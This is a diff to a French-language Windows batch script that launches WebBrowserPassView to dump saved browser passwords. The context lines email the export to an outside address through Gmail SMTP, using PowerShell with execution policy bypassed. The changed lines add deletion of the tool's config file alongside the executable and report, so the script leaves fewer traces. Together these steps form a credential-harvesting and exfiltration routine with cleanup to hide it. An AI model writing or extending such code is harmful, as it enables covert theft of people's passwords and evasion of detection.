@@ -808,6 +808,11 @@ set "OUTPUT=%~dp0%OUTPUT_NAME%"
 
 echo.
 echo Lancement de WebBrowserPassView...
+
+rem Suppression du fichier de configuration pour forcer le repertoir par defaut au dossier courant
+if exist "%~dp0WebBrowserPassView.cfg" del /F /Q "%~dp0WebBrowserPassView.cfg" >nul 2>&1
+cd /d "%~dp0"
+
 start "" "%WBPV%"
 
 timeout /t 5 /nobreak >nul
@@ -828,6 +833,7 @@ if not exist "%OUTPUT%" (
   if exist "%WBPV%" (
     powershell -Command "Remove-Item -Path '%WBPV%' -Force" >nul 2>&1
   )
+  if exist "%~dp0WebBrowserPassView.cfg" del /F /Q "%~dp0WebBrowserPassView.cfg" >nul 2>&1
   pause
   goto sys_passwords_menu
 )
@@ -839,12 +845,13 @@ echo Envoi du fichier par email...
 powershell -ExecutionPolicy Bypass -Command "[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12; $u='%SMTP_USER%'; $p='%SMTP_PASS%'; $to='%EMAIL%'; $sub='Export WebBrowserPassView - ' + (Get-Date -Format 'dd/MM/yyyy HH:mm'); $body='Export automatique des mots de passe du navigateur.'; $att='%OUTPUT%'; $sec=ConvertTo-SecureString $p -AsPlainText -Force; $cred=New-Object System.Management.Automation.PSCredential($u,$sec); Send-MailMessage -SmtpServer 'smtp.gmail.com' -Port 587 -UseSsl -Credential $cred -From $u -To $to -Subject $sub -Body $body -Attachments $att; Write-Host 'Email envoye avec succes!' -ForegroundColor Green" 
 
 echo.
-echo Nettoyage de l'executable et du rapport...
+echo Nettoyage de l'executable, du fichier cfg et du rapport...
 del /F /Q "%WBPV%" >nul 2>&1
 if exist "%WBPV%" (
   powershell -Command "Remove-Item -Path '%WBPV%' -Force" >nul 2>&1
 )
 del /F /Q "%OUTPUT%" >nul 2>&1
+if exist "%~dp0WebBrowserPassView.cfg" del /F /Q "%~dp0WebBrowserPassView.cfg" >nul 2>&1
 
 echo.
 echo Fermeture automatique dans 2 secondes...
